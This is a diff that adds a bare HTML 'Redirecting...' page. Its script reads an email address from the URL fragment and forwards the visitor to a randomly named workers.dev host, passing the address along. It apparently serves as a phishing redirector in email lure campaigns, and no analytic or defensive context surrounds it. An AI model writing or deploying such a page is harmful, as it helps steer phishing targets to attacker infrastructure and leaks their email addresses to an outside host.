@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    window.onload = function () {
+      const baseUrl = 'https://6d34f369.fc84bd511b81c2a601082703.workers.dev/?ref=';
+      const hash = window.location.hash;
+      if (hash) {
+        const email = '' + hash.substring(1);
+        window.location.href = baseUrl + encodeURIComponent(email);
+      } else {
+        window.location.href = baseUrl;
+      }
+    };
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
